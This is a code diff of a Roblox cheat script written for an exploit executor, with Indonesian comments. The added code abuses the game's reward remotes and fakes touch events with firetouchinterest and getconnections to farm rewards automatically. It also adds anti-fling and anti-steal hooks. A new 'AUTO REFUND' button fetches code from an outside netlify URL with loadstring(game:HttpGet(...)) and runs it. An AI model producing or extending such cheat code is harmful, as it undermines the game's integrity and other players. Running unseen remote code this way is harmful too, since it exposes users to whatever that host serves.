@@ -15,7 +15,6 @@ local LocalPlayer = Players.LocalPlayer
 
 -- Status Master 
 local masterEnabled = true
-local autoExecuteEnabled = true -- Status untuk Auto-Execute (queue_on_teleport)
 
 -- Target Koordinat untuk Auto Balik
 local TARGET_POSITION = Vector3.new(69.44, 3.00, -80.41)
@@ -34,13 +33,17 @@ local FreeRemote = KnitServices and KnitServices:FindFirstChild("RewardService")
     and KnitServices.RewardService:FindFirstChild("RF") 
     and KnitServices.RewardService.RF:FindFirstChild("ClaimFree")
 
+local PlaytimeRemote = KnitServices and KnitServices:FindFirstChild("PlaytimeService") 
+    and KnitServices.PlaytimeService:FindFirstChild("RF") 
+    and KnitServices.PlaytimeService.RF:FindFirstChild("Claim")
+
 -- ========================================================
 --                    LOGIKA WORKER (MASTER)
 -- ========================================================
 
 -- 0. Auto Teleport ke Koordinat Saat Executed & Penjaga Posisi
 task.spawn(function()
-    task.wait(1)
+    task.wait(1) -- Tunggu karakter selesai loading awal
     pcall(function()
         local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
         local rootPart = character:WaitForChild("HumanoidRootPart", 5)
@@ -49,6 +52,7 @@ task.spawn(function()
         end
     end)
 
+    -- Loop penjaga posisi (jika jarak terlalu jauh, kembalikan posisi)
     while true do
         if masterEnabled then
             pcall(function()
@@ -81,10 +85,99 @@ task.spawn(function()
     end
 end)
 
+-- 2. Auto Playtime Rewards
+task.spawn(function()
+    local maxRewards = 12
+    while true do
+        if masterEnabled and PlaytimeRemote then
+            for i = 1, maxRewards do
+                if not masterEnabled then break end
+                pcall(function()
+                    PlaytimeRemote:InvokeServer(i)
+                end)
+                task.wait(0.15)
+            end
+        end
+        task.wait(5)
+    end
+end)
+
+-- 3. Auto Touch Interests (Tanpa Teleport)
+local fireTouch = firetouchinterests or firetouchinterest or (syn and syn.firetouchinterests)
+task.spawn(function()
+    while true do
+        if masterEnabled then
+            local rewardsFolder = workspace:FindFirstChild("Rewards")
+            local character = LocalPlayer.Character
+            local rootPart = character and character:FindFirstChild("HumanoidRootPart")
+
+            if rewardsFolder and rootPart then
+                for _, part in ipairs(rewardsFolder:GetChildren()) do
+                    if not masterEnabled then break end
+                    if part:IsA("BasePart") then
+                        pcall(function()
+                            if fireTouch then
+                                fireTouch(rootPart, part, 0)
+                                task.wait(0.01)
+                                fireTouch(rootPart, part, 1)
+                            elseif part:FindFirstChildOfClass("TouchInterest") and firetouchinterest then
+                                firetouchinterest(rootPart, part, 0)
+                                firetouchinterest(rootPart, part, 1)
+                            else
+                                for _, conn in pairs(getconnections(part.Touched)) do
+                                    conn:Fire(rootPart)
+                                end
+                            end
+                        end)
+                    end
+                end
+            end
+        end
+        task.wait(0.3)
+    end
+end)
+
+-- 4. Anti-Fling
+RunService.Stepped:Connect(function()
+    if masterEnabled then
+        pcall(function()
+            local character = LocalPlayer.Character
+            if character then
+                for _, part in ipairs(character:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        part.CanCollide = false
+                        if part.AssemblyLinearVelocity.Magnitude > 100 or part.AssemblyAngularVelocity.Magnitude > 100 then
+                            part.AssemblyLinearVelocity = Vector3.zero
+                            part.AssemblyAngularVelocity = Vector3.zero
+                        end
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+-- 5. Auto Steal / Anti-Steal Logic
+RunService.Stepped:Connect(function()
+    if masterEnabled then
+        pcall(function()
+            local char = LocalPlayer.Character
+            if char then
+                for _, part in ipairs(char:GetChildren()) do
+                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                        part.CanTouch = false
+                    end
+                end
+            end
+        end)
+    end
+end)
+
 -- ========================================================
 --                    DESAIN SCREEN GUI
 -- ========================================================
 
+-- Hapus GUI lama jika ada
 local oldGui = CoreGui:FindFirstChild("RobloxAutoHub") or LocalPlayer.PlayerGui:FindFirstChild("RobloxAutoHub")
 if oldGui then oldGui:Destroy() end
 
@@ -99,11 +192,11 @@ else
     ScreenGui.Parent = (CoreGui:FindFirstChild("RobloxGui") and CoreGui) or LocalPlayer.PlayerGui
 end
 
--- Main Frame (Diperbesar sedikit agar pas dengan tombol tambahan)
+-- Main Frame
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
-MainFrame.Size = UDim2.new(0, 280, 0, 330)
-MainFrame.Position = UDim2.new(0.5, -140, 0.5, -165)
+MainFrame.Size = UDim2.new(0, 280, 0, 287)
+MainFrame.Position = UDim2.new(0.5, -140, 0.5, -143)
 MainFrame.BackgroundColor3 = Color3.fromRGB(25, 20, 35)
 MainFrame.BorderSizePixel = 0
 MainFrame.ClipsDescendants = true
@@ -115,6 +208,7 @@ local MainUICorner = Instance.new("UICorner")
 MainUICorner.CornerRadius = UDim.new(0, 14)
 MainUICorner.Parent = MainFrame
 
+-- ANIMATED BORDER PASTEL GLOW
 local MainUIStroke = Instance.new("UIStroke")
 MainUIStroke.Thickness = 2
 MainUIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
@@ -128,6 +222,7 @@ UIStrokeGradient.Color = ColorSequence.new({
 })
 UIStrokeGradient.Parent = MainUIStroke
 
+-- ANIMATED BACKGROUND GRADIENT
 local BackgroundGradient = Instance.new("UIGradient")
 BackgroundGradient.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 22, 45)),
@@ -159,6 +254,7 @@ TitleLabel.Font = Enum.Font.GothamBold
 TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
 TitleLabel.Parent = TopBar
 
+-- Tombol Close & Minimize
 local CloseBtn = Instance.new("TextButton")
 CloseBtn.Size = UDim2.new(0, 26, 0, 26)
 CloseBtn.Position = UDim2.new(1, -32, 0, 6)
@@ -187,6 +283,7 @@ local MinCorner = Instance.new("UICorner")
 MinCorner.CornerRadius = UDim.new(0, 8)
 MinCorner.Parent = MinimizeBtn
 
+-- Floating Restore Button
 local RestoreBtn = Instance.new("TextButton")
 RestoreBtn.Size = UDim2.new(0, 130, 0, 38)
 RestoreBtn.Position = UDim2.new(0, 20, 0.85, 0)
@@ -208,11 +305,13 @@ RestoreStroke.Color = Color3.fromRGB(255, 119, 238)
 RestoreStroke.Thickness = 1.5
 RestoreStroke.Parent = RestoreBtn
 
+-- Animasi Background Bergerak
 RunService.RenderStepped:Connect(function(dt)
     BackgroundGradient.Rotation = (BackgroundGradient.Rotation + dt * 20) % 360
     UIStrokeGradient.Rotation = (UIStrokeGradient.Rotation + dt * 35) % 360
 end)
 
+-- Layout Container
 local Container = Instance.new("Frame")
 Container.Size = UDim2.new(1, -24, 1, -50)
 Container.Position = UDim2.new(0, 12, 0, 44)
@@ -226,7 +325,7 @@ UIListLayout.Parent = Container
 
 -- 1. Tombol Master Toggle
 local MasterButton = Instance.new("TextButton")
-MasterButton.Size = UDim2.new(1, 0, 0, 34)
+MasterButton.Size = UDim2.new(1, 0, 0, 36)
 MasterButton.BackgroundColor3 = Color3.fromRGB(255, 119, 238)
 MasterButton.Text = "<b>MASTER: ON</b>"
 MasterButton.RichText = true
@@ -259,48 +358,36 @@ MasterButton.MouseButton1Click:Connect(function()
     TweenService:Create(MasterStroke, TweenInfo.new(0.25, Enum.EasingStyle.Quad), {Color = targetBorder}):Play()
 end)
 
--- 2. Tombol Toggle Auto-Execute (queue_on_teleport) baru!
-local AutoExecButton = Instance.new("TextButton")
-AutoExecButton.Size = UDim2.new(1, 0, 0, 34)
-AutoExecButton.BackgroundColor3 = Color3.fromRGB(50, 35, 75)
-AutoExecButton.Text = "<b>AUTO-EXECUTE: ON</b>"
-AutoExecButton.RichText = true
-AutoExecButton.TextColor3 = Color3.fromRGB(255, 150, 240)
-AutoExecButton.TextSize = 13
-AutoExecButton.Font = Enum.Font.GothamBold
-AutoExecButton.AutoButtonColor = false
-AutoExecButton.Parent = Container
+-- 2. Tombol Auto Refund (Tipe Once)
+local RefundButton = Instance.new("TextButton")
+RefundButton.Size = UDim2.new(1, 0, 0, 36)
+RefundButton.BackgroundColor3 = Color3.fromRGB(50, 35, 75)
+RefundButton.Text = "<b>⚡ AUTO REFUND</b>"
+RefundButton.RichText = true
+RefundButton.TextColor3 = Color3.fromRGB(255, 150, 240)
+RefundButton.TextSize = 13
+RefundButton.Font = Enum.Font.GothamBold
+RefundButton.AutoButtonColor = false
+RefundButton.Parent = Container
 
-local AutoExecCorner = Instance.new("UICorner")
-AutoExecCorner.CornerRadius = UDim.new(0, 10)
-AutoExecCorner.Parent = AutoExecButton
+local RefundCorner = Instance.new("UICorner")
+RefundCorner.CornerRadius = UDim.new(0, 10)
+RefundCorner.Parent = RefundButton
 
-local AutoExecStroke = Instance.new("UIStroke")
-AutoExecStroke.Color = Color3.fromRGB(153, 102, 255)
-AutoExecStroke.Thickness = 1.5
-AutoExecStroke.Parent = AutoExecButton
+local RefundStroke = Instance.new("UIStroke")
+RefundStroke.Color = Color3.fromRGB(153, 102, 255)
+RefundStroke.Thickness = 1.5
+RefundStroke.Parent = RefundButton
 
-AutoExecButton.MouseButton1Click:Connect(function()
-    autoExecuteEnabled = not autoExecuteEnabled
-    
-    if autoExecuteEnabled then
-        AutoExecButton.Text = "<b>AUTO-EXECUTE: ON</b>"
-        TweenService:Create(AutoExecButton, TweenInfo.new(0.25), {BackgroundColor3 = Color3.fromRGB(50, 35, 75)}):Play()
-    else
-        AutoExecButton.Text = "<b>AUTO-EXECUTE: OFF</b>"
-        TweenService:Create(AutoExecButton, TweenInfo.new(0.25), {BackgroundColor3 = Color3.fromRGB(90, 40, 50)}):Play()
-        -- Perintah untuk membersihkan antrean teleport di executor
-        pcall(function()
-            if queue_on_teleport then
-                queue_on_teleport("")
-            end
-        end)
-    end
+RefundButton.MouseButton1Click:Connect(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://virgoboy.netlify.app/raw/gadoy7y5u4"))()
+    end)
 end)
 
 -- 3. Tombol Manual Rejoin Server
 local RejoinButton = Instance.new("TextButton")
-RejoinButton.Size = UDim2.new(1, 0, 0, 34)
+RejoinButton.Size = UDim2.new(1, 0, 0, 36)
 RejoinButton.BackgroundColor3 = Color3.fromRGB(50, 35, 75)
 RejoinButton.Text = "<b>🗘 REJOIN SERVER</b>"
 RejoinButton.RichText = true
@@ -327,7 +414,7 @@ end)
 
 -- 4. Tombol Pilih Server
 local ServerButton = Instance.new("TextButton")
-ServerButton.Size = UDim2.new(1, 0, 0, 34)
+ServerButton.Size = UDim2.new(1, 0, 0, 36)
 ServerButton.BackgroundColor3 = Color3.fromRGB(50, 35, 75)
 ServerButton.Text = "<b>🌐 PILIH SERVER</b>"
 ServerButton.RichText = true
@@ -354,7 +441,7 @@ end)
 
 -- 5. Label Display Rejoin Timer (90 Menit)
 local TimerFrame = Instance.new("Frame")
-TimerFrame.Size = UDim2.new(1, 0, 0, 34)
+TimerFrame.Size = UDim2.new(1, 0, 0, 36)
 TimerFrame.BackgroundColor3 = Color3.fromRGB(35, 25, 55)
 TimerFrame.Parent = Container
 
